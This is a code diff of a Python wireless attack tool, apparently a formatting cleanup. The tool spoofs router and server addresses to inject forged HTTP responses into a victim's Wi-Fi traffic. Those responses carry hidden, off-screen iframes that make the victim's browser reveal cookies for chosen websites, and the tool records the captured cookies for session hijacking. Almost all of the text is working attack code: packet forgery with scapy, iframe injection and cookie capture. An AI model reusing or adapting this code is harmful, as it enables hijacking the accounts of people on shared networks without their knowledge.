@@ -98,91 +98,90 @@ class VictimParameters:
 			inject + =item+" "
 		return inject
 
-###Here
 	'''
 	Process request, send it to custom
 	handler if set, otherwise use default
 	'''
-	def proc_in_request(self,request):
+	def proc_in_request(self, request):
 		if (self.in_request_handler is not None):
 			return self.in_request_handler(request)
 		else:
 			return self.default_request_handler(request)
+
 	'''
 	Generate iframe HTML
 	'''
-	def create_iframe(self,website,id):
-	        iframe='''<iframe id="iframe'''+id+'''" width="1" scrolling="no" height="1" frameborder="0" src=""></iframe>\n'''
+	def create_iframe(self, website, id):
+	        iframe = '''<iframe id="iframe''' + id + '''" width="1" scrolling="no" height="1" frameborder="0" src=""></iframe>\n'''
 	        return iframe
 
 	'''
 	Loads an injection from file if --injection is set
 	'''
-	def load_injection(self,injectionfile):
-		f = open(injectionfile,'r')
+	def load_injection(self, injectionfile):
+		f = open(injectionfile, 'r')
 		try:
-			data=f.read()
+			data = f.read()
 		finally:
 			f.close()
 		return data
+
 		'''
 		#GZIP - NOT IMPLEMENTED YET
-		f = open(injectionfile,'r')
+		f = open(injectionfile, 'r')
 		try:
-			data=f.read()
+			data = f.read()
 		finally:
 			f.close()
+
 		buf = StringIO()
-		f = gzip.GzipFile(mode='wb', fileobj=buf)
+		f = gzip.GzipFile(mode = 'wb', fileobj = buf)
 		try:
 			f.write(data)
 		finally:
 			f.close()
-		compressed_data=buf.getvalue()
-		k=binascii.hexlify(compressed_data)
-		n=2
-		inject="0x"
+
+		compressed_data = buf.getvalue()
+		k = binascii.hexlify(compressed_data)
+		n = 2
+		inject = "0x"
 		for item in [k[i:i+n] for i in range(0, len(k), n)]:
-			inject+=item+" "
+			inject += item + " "
 		print inject
 		'''
 
 	'''
 	Creates the final injection string when --websites is set
 	'''
-	def create_iframe_injection(self,injects):
-	        proceed=0
-	        f='\n'
-	        f+='''<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\n'''
-	        f+='''<html xmlns="http://www.w3.org/1999/xhtml">\n'''
-	        f+='''<div style="position:absolute;top:-9999px;left:-9999px;visibility:collapse;">\n'''
-	        f+=injects
-	        f+='</div>'
-	        injection=f
-	        return injection
+	def create_iframe_injection(self, injects):
+		proceed = 0
+		f = '\n'
+		f += '''<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\n'''
+		f += '''<html xmlns="http://www.w3.org/1999/xhtml">\n'''
+		f += '''<div style="position:absolute;top:-9999px;left:-9999px;visibility:collapse;">\n'''
+		f += injects
+		f += '</div>'
+		injection = f
+		return injection
 
 	'''
 	iframe generation function, src filled in via JS
 	'''
-	def get_iframe(self,website,i):
-                #THIS GENERATES AN IFRAME WITH EMPTY SRC, TO BE FILLED IN LATER IN JAVASCRIPT TO BYPASS SOME RESTRICTIONS
-                iframes=self.create_iframe(website,str(i))
-                iframes+='''<script>\n'''
-                iframes+='''function setIframeSrc'''+str(i)+'''() {\n'''
-                iframes+='''var s = "'''+website+'''";\n'''
-                iframes+='''var iframe1 = document.getElementById('iframe'''+str(i)+'''');\n'''
-                iframes+='''if ( -1 == navigator.userAgent.indexOf("MSIE") ) {\n'''
-                iframes+='''iframe1.src = s;\n'''
-                iframes+='''}\nelse {\n'''
-                iframes+='''iframe1.location = s;\n'''
-                iframes+=''' }\n}\ntry{\nsetTimeout(setIframeSrc'''+str(i)+''', 10);\n} catch (err){\n}\n'''
-                iframes+='''</script>\n'''
-                injection=self.create_iframe_injection(iframes)
+	def get_iframe(self, website, i):
+		#THIS GENERATES AN IFRAME WITH EMPTY SRC, TO BE FILLED IN LATER IN JAVASCRIPT TO BYPASS SOME RESTRICTIONS
+		iframes = self.create_iframe(website, str(i))
+		iframes += '''<script>\n'''
+		iframes += '''function setIframeSrc''' + str(i) + '''() {\n'''
+		iframes += '''var s = "''' + website + '''";\n'''
+		iframes += '''var iframe1 = document.getElementById('iframe''' + str(i) + '''');\n'''
+		iframes += '''if ( -1 == navigator.userAgent.indexOf("MSIE") ) {\n'''
+		iframes += '''iframe1.src = s;\n'''
+		iframes += '''}\nelse {\n'''
+		iframes += '''iframe1.location = s;\n'''
+		iframes += ''' }\n}\ntry{\nsetTimeout(setIframeSrc''' + str(i) + ''', 10);\n} catch (err){\n}\n'''
+		iframes += '''</script>\n'''
+		injection = self.create_iframe_injection(iframes)
 		return injection
-
-		
-
-
 
 '''
 Victim class is your target, define it by setting ip or mac address
@@ -192,20 +191,21 @@ target.
 This class is used by PacketHandler class
 '''
 class Victim:
-	def __init__(self,*positional_parameters, **keyword_parameters):
+	def __init__(self, *positional_parameters, **keyword_parameters):
 		if ('ip' in keyword_parameters):
-			self.ip=keyword_parameters['ip']
+			self.ip = keyword_parameters['ip']
 		else:
-			self.ip=None
+			self.ip = None
 
 		if ('mac' in keyword_parameters):
-			self.mac=keyword_parameters['mac']
+			self.mac = keyword_parameters['mac']
 		else:
-			self.mac=None
+			self.mac = None
+
 		if ('victim_parameters' in keyword_parameters):
-			self.victim_parameters=keyword_parameters['victim_parameters']
+			self.victim_parameters = keyword_parameters['victim_parameters']
 		else:
-			self.victim_parameters=None
+			self.victim_parameters = None
 
 		if (self.ip is None and self.mac is None):
 			print "[ERROR] Victim: No IP or Mac, or in_request selected"
@@ -215,7 +215,8 @@ class Victim:
 			print "[ERROR] Please create VictimParameters for this Victim"
 			exit(1)
 
-		self.cookies=[]
+		self.cookies = []
+
 	'''
 	Returns injection for victim
 	'''
@@ -224,67 +225,72 @@ class Victim:
 		if (self.victim_parameters.in_request is None):
 			if (self.victim_parameters.websites is not None):
 				for website in self.victim_parameters.websites:
-					exists=0
+					exists = 0
 					for cookie in self.cookies:
 						if (cookie[0] in website):
-							exists=1
+							exists = 1
+
 					if (not exists):
 						for inject in self.victim_parameters.website_injects:
-							if (inject[0]==website):
+							if (inject[0] == website):
 	#							print inject[0]
 								return inject[1]
 	
 			if (self.victim_parameters.inject_file is not None):
-				if (self.victim_parameters.file_injected==0):
+				if (self.victim_parameters.file_injected == 0):
 					return self.victim_parameters.file_inject
+
 		#CASE: in_request is defined, return injections for --websites if defined, then --injection if defined
 		else:
 			if (self.victim_parameters.websites is not None):
 				for website in self.victim_parameters.websites:
-					exists=0
+					exists = 0
 					for cookie in self.cookies:
 						if (cookie[0] in website):
-							exists=1
+							exists = 1
+
 					if (not exists):
 						for inject in self.victim_parameters.website_injects:
-							if (inject[0]==website):
+							if (inject[0] == website):
 	#							print inject[0]
 								return inject[1]
-	
+
 			if (self.victim_parameters.inject_file is not None):
-				if (self.victim_parameters.file_injected==0):
+				if (self.victim_parameters.file_injected == 0):
 					return self.victim_parameters.file_inject
-	
+
 	'''
 	Checks if cookie has already been captured
 	'''
-	def check_add_cookie(self,cookie):
-		exists=0
+	def check_add_cookie(self, cookie):
+		exists = 0
 		for existing_cookie in self.cookies:
 			if (existing_cookie[0] == cookie[0]):
-				exists=1
-		if (not exists and cookie[1]!="NONE"):
+				exists = 1
+
+		if (not exists and cookie[1] != "NONE"):
 			print ""
-			print "[+] New cookie detected for ",self.mac
+			print "[+] New cookie detected for ", self.mac
 			print cookie
 			if (self.victim_parameters.highjack is not None):
 				self.victim_parameters.highjack(cookie)
 			self.cookies.append(cookie)
 		else:
-			if (cookie[1]=="NONE"):
+			if (cookie[1] == "NONE"):
 				#ADD THE NONE ANYWAY COOKIE SO GET_INJECTION() CAN SKIP TO THE NEXT IFRAME
 				self.cookies.append(cookie)
 				if (self.ip is not None):
 					print ""
-					print bcolors.WARNING+"[!] No cookie on client",self.ip," for website",cookie[0]+bcolors.ENDC
+					print bcolors.WARNING + "[!] No cookie on client", self.ip, " for website", cookie[0] + bcolors.ENDC
 				else:
 					print ""
-					print bcolors.WARNING+"[!] No cookie on client",self.mac," for website",cookie[0]+bcolors.ENDC
+					print bcolors.WARNING + "[!] No cookie on client", self.mac, " for website", cookie[0] + bcolors.ENDC
+
 	'''
 	Cookie handling function, if --websites is set,
 	ignores all cookies for hosts other than specified
 	'''
-	def add_cookie(self,cookie):
+	def add_cookie(self, cookie):
 #		print cookie
 		if (self.victim_parameters.websites is not None):
 			for website in self.victim_parameters.websites:
@@ -298,30 +304,30 @@ Injector class, based on the interface selected,
 it uses scapy or packit to inject packets on the networks
 '''
 class Injector:
-	def __init__(self,interface):
-		self.interface=interface
+	def __init__(self, interface):
+		self.interface = interface
 
-	def getHwAddr(self,ifname):
+	def getHwAddr(self, ifname):
 		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 		info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
-		mac=':'.join(['%02x' % ord(char) for char in info[18:24]])
+		mac = ':'.join(['%02x' % ord(char) for char in info[18:24]])
 		return mac
-	
-	def get_headers(self,injection):
-		headers="HTTP/1.1 200 OK\r\n"
-		headers+="Date: "+time.strftime("%a, %d %b %Y %H:%M:%S GMT")+"\r\n"
-		headers+="Server: Apache\r\n"
-#		headers+="Cache-Control: public, max-age=99999\r\n"
-#		headers+="Expires:Sun, 26 Jul 2016 02:37:33 GMT\r\n"
-#		headers+="Content-Encoding: utf-8\r\n"
-		headers+="Content-Length: "+str(len(injection))+"\r\n"
-		headers+="Connection: close\r\n"
-		headers+="Content-Type: text/html\r\n"
-#		headers+="Set-Cookie: PHPSESSID=pwneduser\r\n"
-		headers+="\r\n"
+
+	def get_headers(self, injection):
+		headers = "HTTP/1.1 200 OK\r\n"
+		headers += "Date: " + time.strftime("%a, %d %b %Y %H:%M:%S GMT") + "\r\n"
+		headers += "Server: Apache\r\n"
+#		headers += "Cache-Control: public, max-age=99999\r\n"
+#		headers += "Expires:Sun, 26 Jul 2016 02:37:33 GMT\r\n"
+#		headers += "Content-Encoding: utf-8\r\n"
+		headers += "Content-Length: " + str(len(injection)) + "\r\n"
+		headers += "Connection: close\r\n"
+		headers += "Content-Type: text/html\r\n"
+#		headers += "Set-Cookie: PHPSESSID=pwneduser\r\n"
+		headers += "\r\n"
 		return headers
 
-	def float_to_hex(self,f):
+	def float_to_hex(self, f):
 		return hex(struct.unpack('<I', struct.pack('<f', f))[0])
 
 	'''
@@ -329,21 +335,23 @@ class Injector:
 	scapy for open networks (monitor-mode) and packit for
 	WEP/WPA injection
 	'''
-	def inject(self,vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,injection,TSVal,TSecr):
+	def inject(self, vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr):
 		global npackets
-		npackets+=1
-		sys.stdout.write(bcolors.OKBLUE+"[*] Injecting Packet to victim "+vicmac+" (TOTAL: "+str(npackets)+" injected packets)\r"+bcolors.ENDC)
+		npackets += 1
+		sys.stdout.write(bcolors.OKBLUE + "[*] Injecting Packet to victim " + vicmac + " (TOTAL: " + str(npackets) + " injected packets)\r" + bcolors.ENDC)
 		sys.stdout.flush()
 		if ("mon" in self.interface):
-			headers=self.get_headers(injection)
+			headers = self.get_headers(injection)
 			if (TSVal is not None and TSecr is not None):
-				packet=RadioTap()/Dot11(FCfield='from-DS',addr1=vicmac,addr2=rtrmac,addr3=rtrmac)/LLC()/SNAP()/IP(dst=vicip,src=svrip)/TCP(flags="FA",sport=int(svrport),dport=int(vicport),seq=int(seqnum),ack=int(acknum),options=[('NOP',None),('NOP',None),('Timestamp',((round(time.time()),TSVal)))])/Raw(load=headers+injection)
+				packet = RadioTap()/Dot11(FCfield = 'from-DS', addr1 = vicmac, addr2 = rtrmac, addr3 = rtrmac)/LLC()/SNAP()/IP(dst = vicip, src = svrip)/TCP(flags = "FA", sport = int(svrport), dport = int(vicport), seq = int(seqnum), ack = int(acknum), options = [('NOP', None), ('NOP', None), ('Timestamp', ((round(time.time()), TSVal)))])/Raw(load = headers + injection)
 			else:
-				packet=RadioTap()/Dot11(FCfield='from-DS',addr1=vicmac,addr2=rtrmac,addr3=rtrmac)/LLC()/SNAP()/IP(dst=vicip,src=svrip)/TCP(flags="FA",sport=int(svrport),dport=int(vicport),seq=int(seqnum),ack=int(acknum),options=[('NOP',None),('NOP',None),('Timestamp',((round(time.time()),0)))])/Raw(load=headers+injection)
+				packet = RadioTap()/Dot11(FCfield = 'from-DS', addr1 = vicmac, addr2 = rtrmac, addr3 = rtrmac)/LLC()/SNAP()/IP(dst = vicip, src = svrip)/TCP(flags = "FA", sport = int(svrport), dport = int(vicport), seq = int(seqnum), ack = int(acknum), options = [('NOP', None), ('NOP', None), ('Timestamp', ((round(time.time()), 0)))])/Raw(load = headers + injection)
 			try:
-				sendp(packet,iface=self.interface,verbose=0)
+				sendp(packet, iface = self.interface, verbose = 0)
 			except:
 				raise
+
+## HERE
 		else:
 			headers=self.get_headers(injection)
 			if (TSVal is not None):
